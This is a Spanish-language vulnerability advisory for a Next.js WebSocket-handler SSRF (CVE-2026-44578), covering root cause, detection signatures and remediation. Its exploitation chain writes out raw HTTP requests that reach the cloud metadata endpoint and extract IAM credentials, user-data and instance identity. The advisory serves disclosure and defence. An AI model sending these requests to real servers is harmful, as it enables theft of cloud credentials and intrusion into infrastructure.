1. Resumen Ejecutivo

CVE-2026-44578 es un Server-Side Request Forgery (SSRF, CWE-918) que afecta despliegues self-hosted de Next.js que utilizan el servidor Node.js integrado. La vulnerabilidad permite a un atacante remoto y no autenticado provocar que el servidor realice peticiones HTTP hacia servicios internos, incluyendo metadatos de infraestructura cloud (IMDS).

La vulnerabilidad se encuentra en el handler de upgrade WebSocket del router interno de Next.js. A diferencia del handler HTTP estándar, la ruta de WebSocket no valida correctamente el estado de la petición proxy, lo que permite que una URI con formato no estándar evada las comprobaciones de seguridad y se redirija a destinos internos arbitrarios.

2. Análisis de la Vulnerabilidad

Root Cause

El handler de upgrade WebSocket en router-server.ts invoca a proxyRequest() cuando parsedUrl contiene un protocolo, pero sin verificar las flags finished y statusCode que el handler HTTP normal siempre comprueba antes de reenviar la petición. Esta divergencia de validación es la causa raíz de la vulnerabilidad.

Mecanismo de Bypass

El ataque utiliza una request line con URI absoluta de doble barra: GET http:///path. El flujo de explotación es el siguiente:

  1. Entrada malformada: El servidor recibe una request line tipo GET http:///latest/meta-data/.
  2. Normalización: La función normalizeRepeatedSlashes colapsa http:/// a http:/, eliminando las barras extra pero quedándose sin hostname.
  3. Proxy interno: La librería http-proxy interpreta http:/ como una petición hacia localhost:80 con el path original intacto.
  4. Desvío al handler vulnerable: Las cabeceras Connection: Upgrade y Upgrade: websocket desvían el flujo al handler WebSocket, que no aplica las comprobaciones de finished / statusCode.

El resultado es que el servidor Node.js de Next.js realiza una petición HTTP interna a localhost:80/path, y el path puede apuntar a cualquier servicio accesible desde la máquina, incluyendo el endpoint de metadatos IMDS en 169.254.169.254 o localhost.

Diferencia clave: El handler HTTP normal comprueba finished y statusCode antes de proxy. El handler de WebSocket no lo hace. Esta omisión es la vulnerabilidad completa.

4. Cadena de Explotación

La cadena completa de explotación sigue estos pasos:

  1. Fingerprint del servidor: Se envía una request WebSocket malformada y se analiza la respuesta para determinar si el servidor es vulnerable. Los headers de respuesta de Next.js confirman la versión del framework.
  2. Enumeración del metadata service: Se utiliza el SSRF para acceder al endpoint de metadatos: 
    GET http:///latest/meta-data/ HTTP/1.1
Host: localhost:3000
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
  3. Extracción de credenciales IAM: Se consultan las credenciales temporales del rol IAM asociado a la instancia: 
    GET http:///latest/meta-data/iam/security-credentials/EC2-Role HTTP/1.1
Host: localhost:3000
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
    La respuesta contiene AccessKeyId, SecretAccessKey y Token temporales.
  4. Acceso a user-data e identity documents: Se extiende el SSRF a /latest/user-data/ y /latest/dynamic/instance-identity/ para obtener scripts de inicialización, información del AMI y configuración de la instancia (cuenta, región, tipo).

Request HTTP Raw

El formato completo del request de explotación es:

GET http:///latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: localhost:3000
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: chat
User-Agent: Mozilla/5.0
Origin: http://localhost:3000
Nota: Las cabeceras Connection: Upgrade y Upgrade: websocket son obligatorias para que el router de Next.js desvíe la petición al handler vulnerable. Sin estas cabeceras, el request sería procesado por el handler HTTP normal que sí aplica las validaciones.

5. Firmas de Detección

Las siguientes firmas permiten detectar intentos de explotación:

En logs del proceso Next.js

Buscar en los logs del servidor Node.js la siguiente línea, que indica que http-proxy intentó conectarse a un destino malformado:

Failed to proxy http:/latest/meta-data/

Esta línea aparece cuando el proxy falla al resolver el destino. En un entorno con logging estructurado, se puede alertar sobre patrones repetidos de este tipo.

En tráfico de red / WAF

Detectar la combinación de los siguientes elementos en el mismo request:

  • Request line con URI absoluta: Cualquier request que comience con GET http:// o GET https:// como path del request-line.
  • Cabeceras de upgrade: Connection: Upgrade junto con Upgrade: websocket.
  • Uso de doble barra: Patrones como http:/// o https:/// en el URI.
# Firma en reglas de WAF (pseudocódigo)
alert http any any -> any any (
  msg:"CVE-2026-44578 - Next.js WebSocket SSRF Attempt";
  content:"GET http://";
  http_header: "Connection: Upgrade";
  http_header: "Upgrade: websocket";
  sid:1000001; rev:1;
)

6. Remediación

Opción recomendada: Actualizar Next.js

Actualizar a una versión parcheada es la remediación primaria:

# Si usa la rama 15.x:
npm install next@15.5.16

# Si usa la rama 16.x:
npm install next@16.2.5

Medidas de mitigación si no se puede actualizar

  1. Bloquear upgrades WebSocket en el proxy inverso: Si NGINX o similar sitúa delante de Next.js, bloquear peticiones que combinen URIs absolutas con cabeceras de upgrade WebSocket.
  2. Aplicar IMDSv2: Forzar el uso de IMDSv2 que requiere un token temporal, haciendo que el SSRF ciego no pueda acceder directamente a los metadatos: 
    # En AWS CLI:
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-endpoint enabled
  3. Bloquear URIs absolutas en NGINX: Añadir una regla antes del proxy pass para rechazar peticiones con URI absoluta: 
    server {
    listen 3000;

    # Bloquear URIs absolutas (CVE-2026-44578)
    if ($request_uri ~* "^https?://") {
        return 400;
    }

    location / {
        proxy_pass http://127.0.0.1:3001;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
